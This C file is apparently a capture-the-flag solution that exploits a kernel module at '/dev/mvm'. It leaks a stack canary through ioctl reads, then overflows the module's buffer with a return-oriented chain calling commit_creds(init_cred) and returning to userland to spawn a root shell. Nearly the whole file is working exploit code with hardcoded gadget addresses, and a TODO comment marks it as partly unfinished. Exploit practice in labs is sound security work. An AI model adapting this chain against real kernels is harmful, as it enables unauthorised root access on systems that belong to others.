#include <stdio.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define WRITE 0x6d766d
#define READ 0x4d564d

#define KERN_BASE 0xffffffff81000000


#define POP_RBP_RET 0xffffffff8101099f
#define RET 0xffffffff81000149
#define SYS_SET_UID 0xffffffff810a5dc0
#define POP_RDI_RET 0xffffffff8128ac68
#define PUSH_RAX_RET 0xffffffff81ff6755
#define RETURN_TO_USER 0xffffffff822015d0
#define NOP_RET 0xffffffff8103cd3e
#define IRET 0xffffffff82009266
#define INIT_CRED 0xffffffff83052960
#define INIT_TASK 0xffffffff8300c940

#define PREPARE_KERNEL_CRED 0xffffffff810bf4b0
#define COMMIT_CREDS 0xffffffff810bf200

#define SWAPGS_PLUS_103 0xffffffff82201637


#define BLOCKS 10
#define CANARY_BLOCKS 11
#define PAYLOAD_BLOCKS 15

unsigned long long base_address = 0;
unsigned long long stack_pointer = 0;

struct mvm {
    uint64_t Mvm;
    uint64_t mVm;
    uint64_t mvM;
    struct mvm* mvm;
} __attribute__ ((packed));


__attribute__((naked)) void win(){
    asm("movq stack_pointer, %rsp");
    asm("mov %rsp, %rbp");
    printf("You win!\n");
    system("/bin/sh");
};


int main(){
    int challenge = open("/dev/mvm",O_RDWR);

    if(challenge==NULL){
        printf("error opening the challenge module. Errno: %d\n",errno);
    }


    struct mvm payload[BLOCKS] = {};

    stack_pointer = (unsigned long long)&payload[0];

    for(int i = 0; i < BLOCKS; i++){
        payload[i].Mvm = 0xdeadbeef;
        payload[i].mVm = 0xdeadbeef;
        payload[i].mvM = 0xdeadbeef;
        if (i > 0) {
            payload[i-1].mvm = &payload[i];
        }
    }

/*
    Base is known, we can calculate the address of any function
    Also theres a bof inside the copy_from_user function, means we can overwrite the return address of the function

*/

    int code = ioctl(challenge,WRITE,&payload[0]);
    printf("First write happened. code %d\n",code);

    struct mvm payload2[CANARY_BLOCKS] = {};

    code = ioctl(challenge,READ,&payload2[0]);
    printf("First Read happened. code %d\n",code); 


    for (int i = 0; i < CANARY_BLOCKS; i++){
        printf("-------%d-------\n",i+1);
        printf("Mvm: %llx\n",payload2[i].Mvm);
        printf("mVm: %llx\n",payload2[i].mVm);
        printf("mvM: %llx\n",payload2[i].mvM);
        printf("mvm: %llx\n",payload2[i].mvm);
    }

    unsigned long long canary = payload2[CANARY_BLOCKS-1].Mvm;
    printf("Canary: %llx\n",canary);

    struct mvm payload3[PAYLOAD_BLOCKS+1] = {};

    for(int i = 0; i < PAYLOAD_BLOCKS+1; i++){
        payload3[i].Mvm = 0xdeadbeef;
        payload3[i].mVm = 0xdeadcafe;
        payload3[i].mvM = 0xcafebabe;
        if (i > 0) {
            payload3[i-1].mvm = &payload3[i];
        }
    }

    payload3[CANARY_BLOCKS-1].Mvm = canary;


    // skip the first next pointer
    payload3[PAYLOAD_BLOCKS-4].mVm = RET;
    payload3[PAYLOAD_BLOCKS-4].mvM = POP_RBP_RET;

    payload3[PAYLOAD_BLOCKS-3].Mvm = POP_RDI_RET;
    payload3[PAYLOAD_BLOCKS-3].mVm = INIT_CRED;
    payload3[PAYLOAD_BLOCKS-3].mvM = POP_RBP_RET;

    payload3[PAYLOAD_BLOCKS-2].Mvm = COMMIT_CREDS;
    payload3[PAYLOAD_BLOCKS-2].mVm = SWAPGS_PLUS_103;
    /* TODO: find a way to move rax into rdi */
    payload3[PAYLOAD_BLOCKS-2].mvM = POP_RBP_RET;

    payload3[PAYLOAD_BLOCKS-1].Mvm = (uint64_t)&win;
    payload3[PAYLOAD_BLOCKS-1].mVm = 0x33; /* Segment register CS -- Must be 0x33 */
    payload3[PAYLOAD_BLOCKS-1].mvM = 0x246; /* eflags*/

    payload3[PAYLOAD_BLOCKS].Mvm = 0x2b; /* ss */

    /*
    rdi = random
    rax = random
    rip = &win
    cs = 0x33 in x64
    eflags = 0x246
    rsp = random
    ss = 0x2b
    */


    // commit_creds(prepare_kernel_cred(0));
    // return_to_userland();




    code = ioctl(challenge,WRITE,&payload3[0]);
    printf("Second write happened. code %d\n",code);

    setuid(0);
    execve("/bin/sh",NULL,NULL);

    return 0;
}